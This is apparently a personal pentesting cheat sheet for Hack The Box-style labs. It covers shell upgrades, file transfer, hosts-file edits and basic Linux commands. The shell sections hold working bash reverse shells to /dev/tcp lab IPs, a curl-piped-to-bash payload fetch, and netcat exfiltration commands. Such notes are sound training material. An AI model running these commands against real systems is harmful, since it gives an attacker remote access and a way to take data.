## Shell


### bin/bash vs bin/shell
- at bin/shell only $ is shown
- at bin/bash the whole path is shown

### Bad Shells
- sudo -l for example dont delvier anything
- some stuff is not working well
- can happen when over exploits etc
- no tty present

#### Reasons for bad shells
- wrong shell architecture x86 vs x64
- wrong shell type (bash, sh, zsh, etc.)
- shell over exploit, includes, etc.

### Good Shells
- sudo -l delivers something
- maybe even tab completion
- print 
- meterpreter shells are also nice often

### Upgrade a shell
- metersploit can do it
- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) sometimes didnt work
```sh
# when commands are restricted
ssh guest@192.254.1.12 -t "bash --noprofile" # --noprofile can work

#curl a shell
echo "/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.190/1338 0>&1'" > shell.sh
python3 -m http.server 8001
nc -lvnp 1338
curl 10.10.14.190:8001/shell.sh|bash

# phyton or phyton3 import pty
python -c 'import pty; pty.spawn("/bin/bash")'
#or 
echo os.system('/bin/bash') # or echo os.system('/bin/sh') 
#or
/bin/sh -i # or /bin/bash -i
```

### Transfer files
- httb, ftp, ssh, smb, scp, curl, wget, netcat etc
```sh
#http python server
python3 -m http.server 8000
wget http://yourip:8000/file

```
simple http put server to put from victim to attacker
- https://gist.github.com/fabiand/5628006
```sh
#windows to get a file from http server
certutil -urlcache -split -f "http://" outputfile

#curl or wget ftp or http
wget ftp:// 

#netcat
nc -l -p 1234 > out.file #receiving box
nc -w 3 [destination] 1234 < out.file #sending box destination is the ip of the receiving box

#scp
scp file user@ip:/path/to/file # sending
```

### Hosts File
echo to host file

```sh
cat

```sh
echo "10.129.108.117 thetoppers.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.251.52 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.1.27 ignition.htb" | sudo tee -a /etc/hosts
```

liste aller offenen Ports

```sh
-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.

ss -tln

```
```sh
sudo netstat -tulnp
```

### Other Commands

#### whoami
```sh
whoami #print current user
```
#### uname
```sh
uname -a #print system information
```
#### get own ip
```sh
ip a | grep tun0 
```
#### ifconfig
```sh
ifconfig #print network information
```

#### pwd
```sh
pwd #print working directory
```

#### Differences between files
```sh
diff -y file1 file2
-y # side by side
```

#### SU & Sudo
```sh
su otheruser #switch user
sudo -l #list sudo rights
sudo su #switch to root
```

#### Locate
Suchen von Dateien
```sh
locate PowerUp.ps1
```

#### arp
```sh
arp -e # get machines the target has spoken to
```



## Reverse shells Server
- Kali contains a share folder with shell scrips
- Shell from the target to the attacker.
- possible to connect throught firewall

#### Some Reverse Shell generators / links
- [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [High on Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [Revshells](https://www.revshells.com/)

```sh
#create a listener for shell session
nc -nvlp 1337

#!/bin/bash
bash -i >& /dev/tcp/10.10.15.71/1337 0>&1

python3 -m http.server 8000
```
